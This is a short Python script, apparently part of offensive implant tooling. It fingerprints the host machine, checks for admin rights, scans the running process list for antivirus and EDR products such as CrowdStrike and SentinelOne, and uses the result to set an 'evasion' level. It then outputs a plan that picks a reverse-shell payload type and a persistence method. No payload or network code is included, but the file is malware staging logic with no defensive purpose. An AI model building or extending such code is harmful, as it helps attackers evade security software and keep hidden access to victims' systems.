import platform
import os
import subprocess
import json
from pathlib import Path

class AutonomousCore:
    def __init__(self):
        self.profile = self._gather_profile()
        self.evasion_level = self._calculate_evasion()

    def _gather_profile(self):
        return {
            "os": platform.system().lower(),
            "arch": platform.machine(),
            "kernel": platform.release(),
            "user": os.environ.get('USER') or os.environ.get('USERNAME') or 'unknown',
            "is_admin": self._check_admin(),
            "av_detected": self._scan_av()
        }

    def _check_admin(self):
        try:
            if platform.system() == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            return os.getuid() == 0
        except: return False

    def _scan_av(self):
        # Mock AV scan logic for professional profile
        common_av = ["defender", "avast", "norton", "crowdstrike", "sentinelone"]
        detected = []
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output(['tasklist'], text=True).lower()
                for av in common_av:
                    if av in output: detected.append(av)
            except: pass
        return detected

    def _calculate_evasion(self):
        if not self.profile["av_detected"]: return "standard"
        return "aggressive"

    def get_deployment_plan(self):
        plan = {
            "target": self.profile["os"],
            "evasion": self.evasion_level,
            "recommended_payload": "reverse_ssh_mtls" if self.evasion_level == "aggressive" else "reverse_tcp",
            "persistence": "scheduled_task" if self.profile["is_admin"] else "user_init"
        }
        return plan

if __name__ == "__main__":
    core = AutonomousCore()
    print(json.dumps(core.profile, indent=4))
    print(json.dumps(core.get_deployment_plan(), indent=4))
